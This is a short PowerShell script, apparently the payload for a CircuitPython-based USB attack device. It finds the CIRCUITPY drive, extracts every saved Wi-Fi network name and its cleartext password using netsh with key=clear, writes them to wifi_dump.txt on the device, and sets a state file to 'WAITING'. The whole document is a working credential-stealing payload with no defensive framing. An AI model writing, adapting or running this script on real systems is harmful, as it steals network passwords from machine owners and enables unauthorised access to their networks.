$cp = (Get-Volume -FileSystemLabel "CIRCUITPY").DriveLetter
if (-not $cp) { exit }

$out   = Join-Path "${cp}:" "wifi_dump.txt"
$state = Join-Path "${cp}:" "state.txt"

$results = @()

# Get SSIDs
netsh wlan show profiles | ForEach-Object {

    if ($_ -match 'All User Profile\s*:\s*(.+)$') {
        $ssid = $matches[1].Trim()

        # Get profile details
        $profile = netsh wlan show profile name="$ssid" key=clear

        if ($profile -match 'Key Content\s*:\s*(.+)$') {
            $key = $matches[1].Trim()
            $results += "$ssid : $key"
        }
    }
}

$results | Out-File -Encoding ASCII $out
Set-Content -Encoding ASCII $state "WAITING"